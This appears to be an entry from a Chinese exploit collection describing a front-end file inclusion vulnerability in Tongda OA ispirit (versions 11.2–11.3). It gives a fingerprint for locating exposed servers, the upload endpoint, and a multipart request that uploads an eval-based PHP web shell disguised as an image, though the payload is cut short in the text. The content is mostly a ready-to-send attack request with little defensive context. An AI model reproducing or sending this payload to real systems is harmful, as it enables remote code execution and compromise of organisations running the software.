# 通达OAispirit存在前台文件包含漏洞

- **系统**：通达OA　|　**类型**：文件包含　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /ispirit/im/upload.php HTTP/1.1`

**请求体 / payload**
```
上传文件
Host: {hostname}
Content-Length: 639
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"
1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"
1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"
1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="png"
Content-Type: image/jpeg
<?php class GB7W5S8T { public function __construct($H7U41){ @eval("/*Zc98E…（脚本共 823 字，完整版见原文）
```

**其他**
- 通达OA ispirit存在前台文件包含漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA V11.2-通达OA 11.3